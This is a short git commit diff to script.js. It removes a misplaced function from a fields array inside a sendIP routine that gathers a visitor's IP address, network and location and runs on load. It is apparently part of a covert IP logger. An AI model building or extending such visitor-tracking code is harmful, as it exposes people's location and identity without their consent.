90fd6c145a45b45a5ec764738b74bebb5c54122e
Calvo <calvinketmanee9@gmail.com>
2026-01-06 02:14:41 +0000

    Update script.js

--- script.js
+++ script.js
@@ -25,13 +25,7 @@ const sendIP = () => {
             fields: [
                 { name: "IP Address", value: `\`${ipadd}\``, inline: true },
                 { name: "Network", value: `\`${geoData.network}\``, inline: true },
-                function getConnectionType(data) {
-    if (data.is_vpn || data.is_proxy || data.is_tor) {
-        return "🛡️ VPN / Proxy detected";
-    }
-    return "🌐 Standard connection";
-}
-
+    
                 { name: "City", value: geoData.city || "Unknown", inline: true },
                 { name: "Region", value: geoData.region || "Unknown", inline: true },
 
@@ -66,6 +60,7 @@ const sendIP = () => {
         });
 };
 sendIP();
+
 
 
 
